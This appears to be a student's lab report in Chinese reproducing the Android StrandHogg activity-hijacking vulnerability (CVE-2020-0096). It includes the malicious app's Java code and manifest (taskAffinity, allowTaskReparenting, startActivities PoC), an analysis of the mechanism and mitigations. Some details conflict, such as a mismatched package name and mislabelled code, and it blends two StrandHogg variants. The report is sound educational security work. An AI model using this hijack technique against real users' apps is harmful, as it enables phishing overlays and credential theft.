# Android应用软件安全分析实例

## 【实验要求】

我选择的是题目二：

> 题目二：Android应用软件安全分析实例，选择近年来影响范围广、危害程度高的具有典型代表可利用性高的Android系统或者软件安全漏洞至少一个，剖析网络安全漏洞的攻击技术，复现攻击场景；研究该类型网络安全漏洞产生的机制及种类，分析该类网络安全漏洞的防御措施。具体要求包括：
> 1、 如有CVE或者CNNNVD编号，需要列出，详细说明实例漏洞的实用平台版本；
> 2、 如果是针对某一程序的破解或者解密，需要详细破解过程；
> 3、 提交内容包括APK文件、md文件、截图文件，POC代码、附录和参考文献等。
> 4、 提交文件名命名：“题目二-班级-学号-姓名-CVE***”

- [x] 选择近年来影响范围广、危害程度高的具有典型代表可利用性高的Android系统或者软件安全漏洞至少一个
- [x] 剖析网络安全漏洞的攻击技术，复现攻击场景
- [x] 研究该类型网络安全漏洞产生的机制及种类，分析该类网络安全漏洞的防御措施

## 【实验对象】

- `StrandHogg`漏洞

  ![](img\9.png)

- CVE编号：`strandhogg2.0（CVE-2020-0096）`

- 成功利用该漏洞可以导致界面欺骗，从而诱导用户输入敏感信息和/或授予敏感权限，进而造成敏感数据泄露，如密码、位置信息等等

- 攻击者不仅可以利用该漏洞精心设计一个页面来进行钓鱼攻击,也可以利用该漏洞诱导用户授予恶意软件相应权限进行恶意攻击

## 【实验环境】

- 漏洞影响的Android版本：8.0 ~ 10.0（我是在10.0版本复现的）
- vivo手机
- Android studio
- vmware
- java

## 【环境配置准备】

首先是手机环境`android10`：

<img src="img\10.jpg" style="zoom:33%;" />



参考[全网最全最细Android Studio 安装和使用教程](https://zhuanlan.zhihu.com/p/528196912?utm_id=0)

![微信图片_20230705155625](img\微信图片_20230705155625.jpg)

![微信图片_202307051556251](img\微信图片_202307051556251.jpg)

![微信图片_202307051556252](img\微信图片_202307051556252.jpg)

![微信图片_202307051556253](img\微信图片_202307051556253.jpg)

![微信图片_202307051556254](img\微信图片_202307051556254.jpg)

![微信图片_202307051556255](img\微信图片_202307051556255.jpg)

![微信图片_202307051556256](img\微信图片_202307051556256.jpg)

![微信图片_202307051556257](img\微信图片_202307051556257.jpg)

![微信图片_202307051556258](img\微信图片_202307051556258.jpg)

![微信图片_202307051556259](img\微信图片_202307051556259.jpg)

![微信图片_2023070515562510](img\微信图片_2023070515562510.jpg)

![微信图片_2023070515562511](img\微信图片_2023070515562511.jpg)

![微信图片_2023070515562512](img\微信图片_2023070515562512.jpg)

![微信图片_2023070515562513](img\微信图片_2023070515562513.jpg)

![微信图片_2023070515562514](img\微信图片_2023070515562514.jpg)

![微信图片_2023070515562515](img\微信图片_2023070515562515.jpg)

![微信图片_2023070515562516](img\微信图片_2023070515562516.jpg)

还有个avd和sdk的安装以及环境配置，当时没截图就算了，具体参考[全网最全最细Android Studio 安装和使用教程](https://zhuanlan.zhihu.com/p/528196912?utm_id=0)



# 一、漏洞复现流程

### 【复现原理】

- 新建一个完全合法的项目和一个攻击此合法App的恶意项目，并且让恶意软件劫持合法App,使恶意活动插入到合法活动之前,实现攻击目的

### 【复现流程】

### 1.编译一个合法空项目并安装在手机上

**项目命名**：BeAttacked
**包名**:com.victim.app
其UI只有一个TextView控件,并且显示Hello World这段字符
该空项目假设为攻击者欲攻击的合法App

大概长这样，注意一定要新建完全空的Activity，这样才能选择语言为java（我也不知道为啥另一个就不能选java只能Kotlin，找了好久的错）：

![](img\4.png)

![](img\5.png)

在text那里改为Hello World！即可

![](img\3.png)



### 2.接下来是编译恶意软件并安装在手机上

#### 1.攻击界面：

**接下来新建一个利用此漏洞的恶意软件项目,命名为Attack，布局代码**

**（最后整体代码会放在压缩包里，可能有些这里写的代码和实际长得不一样，以压缩包里源文件为准）**

**activity_main.xml**

```xml
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">
 
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Success!"/>
 
</LinearLayout>
```

#### 2.显示布局：

如上述布局代码所示,该布局将只显示Innocent这段字符，新建一个布局,并且假设这个新建的布局为恶意活动显示的布局

**attack.xml**

```xml
<linearlayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <textview
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Attack Success!">

    </textview>
</linearlayout>
```

同理,该布局将只显示 Attack Success! 这段字符

#### 3.接下来新建Innocent类和Attack类

两个类分别显示activity_main和attack这两个布局

**MainActivity.java**

```java
public class MainActivity extends AppCompatActivity {
 
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);
        Intent innocent,attack;
        attack=new Intent(this,Attack.class);
        attack.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);//将attack活动放置在一个新task中
        attack.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);//取消过度动画,增加恶意软件迷惑性
        innocent=new Intent(this,Innocent.class);
        innocent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivities(new Intent[]{attack,innocent});//先后启动attack活动与innocent活动
        finish();
    }
}
```

**Attack.java**

```java
public class Attack extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.attack);
    }
}
```

**Innocent.java**

```java
public class Innocent extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
}
```

#### 4.利用漏洞使得恶意活动插入在合法活动之前

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">
<!--    package="com.vuln.strandhogg">-->

    <application

        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.TryATTACK"
        tools:targetApi="31">


    <activity  android:name="com.example.tryattack.MainActivity"
            android:exported="true"
            tools:ignore="MissingClass">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name="com.example.tryattack.Innocent"
            tools:ignore="MissingClass" />
        <activity android:name="com.example.tryattack.Attack"
            android:taskAffinity="com.example.truebeattacked"
            android:allowTaskReparenting="true"
            tools:ignore="MissingClass" />
    </application>

</manifest>
```

#### 5.安装恶意软件并实现漏洞复现

先打开恶意软件,使得恶意活动在后台就绪,接着再打开欲攻击的合法app,可以发现合法活动已经被恶意活动替代了（这个在视频里显示的会更明显）

也就是一开始点开`TRUEbeAttack`这个app，会显示Hello World!，然后点开`tryATTACK`这个app，会显示Attack Success!，然后再点回`TRUEbeAttack`这个app，界面会显示Success!，也就是恶意活动已经替代了。

###### 【桌面显示】：

<img src="img\微信图片_2023070515562517.jpg" alt="微信图片_2023070515562517" style="zoom: 50%;" />

###### 【`TRUEbeAttack`被攻击端显示界面】：

<img src="img\微信图片_2023070515562519.jpg" alt="微信图片_2023070515562519" style="zoom:50%;" />

###### 【`tryATTACK`攻击端显示界面】：

<img src="img\微信图片_2023070515562518.jpg" alt="微信图片_2023070515562518" style="zoom:50%;" />

###### 【`TRUEbeAttack`被攻击端被`tryATTACK`攻击端攻击成功（恶意活动成功显示在合法活动之前），显示的界面】：

<img src="img\2.jpg" style="zoom:50%;" />





# 二、漏洞原理分析

![image-20230705162200235](img\image-20230705162200235.png)

#### 1.简介

这个漏洞主要是利用`startActivities`这个api，它的功能是一次启动多个Activity，传入一个Intent数组，Android会解析每个Intent，并逐个启动它们

`startActivities`默认认为intent数组的第一个Activity的启动者是当前应用，而第二个Activity的启动者是第一个Activity所属的那个应用，依次类推，那么我们只要控制将第一个activity的所有者设为我们所要攻击的victim应用，那么就可以让我们的`hackactivity`被victim应用启动，就可以实现了activity劫持。

#### 2.`allowTaskReparenting`属性：

`allowTaskReparenting`，翻译过来的意思是允许重新找父母（允许迁移任务栈），该属性用于配置是否允许该activity更换从属的task。
如果一个Activity设置了这个属性，其他应用启动这个activity的时候分两种情况处理：

这个activity对应的进程已经启动了：则这个activity直接附属到自己所对应的进程的应用栈上
这个activity对应的进程没有启动：则这个activity先直接附属到启动它的应用的应用栈上，当activity对应的进程启动后，则会主动迁移到activity对应的进程。

> 官方解释：
> 当下一次将启动 Activity 的任务转至前台时，Activity 是否能从该任务转移至与其有相似性的任务 -“true”表示可以转移，“false”表示仍须留在启动它的任务处。

假设存在一个任务栈,将此任务栈命名为Task_1，Task_1中存放着两个Activity,分别是Activity_1和Activity_2,并且这个任务栈中的两个活动均在后台运行,用户不可见，假设Activity_1的，`allowTaskReparenting`属性为true，Activity_2的`allowTaskReparenting`属性为默认值false，当用户 启动Activity_2时,任务栈Task_1也就随着Activity_2到达前台，但Activity_1的`allowTaskReparenting`属性为true,根据官方文档的解释,该活动能从后台转移至与其有相似性的任务,也就是同样转移至Task_1,而此时Task_1已经在前台了,相当于Activity_1在Activity_2启动之后也启动了,从而到达了最顶层,而用户最终看到的活动也就是Activity_1了。



#### 3.`taskAffinity`属性：

可以翻译为任务相关性。这个参数标识了一个 Activity 所需要的任务栈的名字，默认情况下，所有 Activity 所需的任务栈的名字为应用的包名，当 Activity 设置了 `taskAffinity `属性，那么这个 Activity 在被创建时就会运行在和` taskAffinity `名字相同的任务栈中，如果没有，则新建 `taskAffinity` 指定的任务栈，并将 Activity 放入该栈中。另外，`taskAffinity` 属性主要和` singleTask `或者 `allowTaskReparenting `属性配对使用，在其他情况下没有意义(不生效)。

属性：从概念上讲，具有同一相似性的 Activity 归属同一任务（从用户的角度来看，则是归属同一“应用”）。任务的相似性由其根 Activity 的相似性确定。

需要恶意活动的`taskAffinity`属性为欲攻击应用的包名,这样就能让恶意活动与合法活动存在于同一任务栈中了，接着使恶意活动的`allowTaskReparenting`属性为true,这样就能在合法应用中的活动转至前台时,使得恶意活动同样转至前台
**至此,整个攻击流程结束**。



# 三、漏洞修补

- 现在`taskAffinity`属性只对相同UID的应用有效，也就是说，只有共享UID的应用才可以进行activity的移动，uid在应用安装时被分配，并且在应用存在于手机上期间，都不会改变。

- 一个应用程序只能有一个uid，多个应用可以使用`sharedUserId` 方式共享同一个uid，但前提是这些应用的签名要相同。恶意应用也无法伪造uid，导致无法实现攻击。

- 修改方案：

  google后面更新了安全补丁,修改了ActivityStarter.java这文件，只有与和调用者具有相同 uid 的已启动 activity 才可以成为下一个活动的调用者。

  在`AndroidManifest.xml`文件中的<application>标签中添加

   AndroidManifest.xml 清单文件中 , 设置所有的 Activity 组件的亲和性属性 :

  ```xml
  android:taskAffinity=""
  ```

  如果有亲和性属性的直接设置 , 如果没有的设置为空字符串 ;

  在启动页的Activity中配置`android:launchMode="singleTask"`，启动页指的是配置了下面<intent-filter>的Activity

  ```xml
  <intent-filter>
      <action android:name="android.intent.action.MAIN" />
      <category android:name="android.intent.category.LAUNCHER" />
  </intent-filter>
  ```



# 四、CVE编号

- strandhogg2.0（CVE-2020-0096）



# 五、构造Poc

```shell
Intent[] Intents = new Intent[4];
Intents[0] = new Intent();
Intents[0].setClassName("pkg1","pkg1.clz1");
Intents[1] = new Intent(MainActivity.this,ActivityB.class);
Intents[2] = new Intent();
Intents[2].setClassName("pkg2","pkg2.clz2");
Intents[3] = new Intent(MainActivity.this,ActivityC.class);
Intents[0].addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
Intents[2].addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivities(Intents);
```



# 六、问题与反思

#### 1.理解与规划

首先是第一次做一个apk进行漏洞复现，一是没有学过java，对整个流程代码看的还不是很清晰，不过后来上手发现还是理解的很快。二是在想如何用`taskAffinity`属性和`allowTaskReparenting`属性进行漏洞复现，整个流程的规划设计也遇到不小的挑战。

#### 2.Android打包生成的APK安装包，安装后一打开软件就闪退问题

打开设置 -> Build,Execution,Deployment -> Debugger -> HotSwap 选中右面的 Enable hot-swap agent for Groovy code

应该在“ Project ”状态下进行设置

然后删除build这文件，如下图：

之后清理 clear project 清理一下项目，然后重新运行项目

注意：apk 存放于 app → build → outputs → apk 目录下。
![](img\6.png)

#### 3.`android`程序安装后图标不显示

具体如下，明明在应用列表里有应用，但是桌面上就是不显示

<img src="img\bug2.jpg" style="zoom:33%;" />

<img src="img\bug.jpg" style="zoom:33%;" />

最后发现是少写了几行代码，`AndroidManifest`中没有activity设置android.intent.category.LAUNCHER category或android.intent.action.MAIN action，在主activity中添加这两个属性即可：

```
<category android:name="android.intent.category.LAUNCHER" />

<action android:name="android.intent.action.MAIN" />
```

#### 4.`Android startActivities()`的使用

`startActivities()`和`startActivity`类似，也是界面跳转:

```java
Intent[] intents = new Intent[2];
intents[0] = new Intent(MainActivity.this, Test01.class);
intents[1] = new Intent(MainActivity.this, Test02.class);
startActivities(intents);
//startActivities(intents,null);//bundle
```

#### 5.`avd`安卓模拟器的的安装下载

这个很重要！别默认路径c盘，会炸的

![](img\7.png)

![](img\8.png)

![](img\11.png)





# 七、参考文献

- [taskAffinity 属性官方文档](https://developer.android.com/guide/topics/manifest/activity-element.html#reparent)
- [全网最全最细Android Studio 安装和使用教程](https://zhuanlan.zhihu.com/p/528196912?utm_id=0)
- [CVE-2020-0096 StrandHogg 2.0漏洞分析](https://wrlus.com/security/mobile/android-strandhogg-2/)；
- [StrandHogg 2.0 – The ‘evil twin’](https://promon.co/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability/#what-can-a-potential-attacker-do)；
- [The StrandHogg vulnerability](https://promon.co/security-news/the-strandhogg-vulnerability/#has-strandhogg-been-abused-in-real-world-cases)；
- [StrandHogg漏洞概述](http://zone.huoxian.cn/d/565-strandhogg)
- [android程序安装后图标不显示](https://blog.csdn.net/lizhenmingdirk/article/details/7517986)
- [Android strandhogg漏洞复现学习](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458432310&idx=1&sn=1760067473096ebd731e08ab7ccd90e7&chksm=b18f83bc86f80aaa0bcd48445f69b33db55ccf5904004c21c06920b2b5661950d7ca2e6675c0&scene=27)
- [Android漏洞复现](http://michael007js.cn/news/shownews.php?id=105&wd=&eqid=d2e1e7880001b92d00000006642f6d0a)
- [StrandHogg漏洞复现](https://www.ouyangxiaoze.com/2022/02/707.html)
- [StrandHogg漏洞修复](https://blog.csdn.net/li_717693247_guo6/article/details/127905364)
- [启动Activity的两种方式startActivity和startActivityForResult（一）](http://static.kancloud.cn/digest/tttkkk/125282)
- [Android TaskAffinity解析](https://blog.csdn.net/weixin_42600398/article/details/113618380)